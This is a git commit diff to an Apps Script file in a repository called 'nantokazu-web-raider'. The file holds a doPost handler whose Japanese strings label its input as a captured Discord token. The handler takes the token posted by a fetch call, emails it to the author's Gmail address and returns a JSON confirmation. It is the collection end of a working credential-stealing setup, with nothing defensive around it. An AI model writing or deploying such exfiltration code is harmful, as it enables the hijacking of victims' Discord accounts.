2717035bc9f3ab49c453a3037c9c235b0f93bff8
nantokazu <nantokazu0320@gmail.com>
2025-09-11 04:11:23 +0900

    Update script2.js

--- nantokazu-web-raider/script2.js
+++ nantokazu-web-raider/script2.js
@@ -1,8 +1,16 @@
-function doPost (e) {
-    var token = e.postData.contents.token;
-    var email = "your_email@gmail.com"; // 自分のGmailアドレス
-    var subject = "ディスコードトークン";
-    var body = "取得したディスコードトークン: " + token;
+function doPost(e) {
+  // fetch から送られてくる JSON を解析
+  var data = JSON.parse(e.postData.contents);
+  var token = data.token;
 
-    GmailApp.sendEmail(email, subject, body);
+  var email = "nantokazu0320@gmail.com"; // 自分のGmailアドレス
+  var subject = "ディスコードトークン";
+  var body = "取得したディスコードトークン: " + token;
+
+  GmailApp.sendEmail(email, subject, body);
+
+  // fetch に返す JSON
+  return ContentService
+    .createTextOutput(JSON.stringify({status: "OK", tokenReceived: token}))
+    .setMimeType(ContentService.MimeType.JSON);
 }
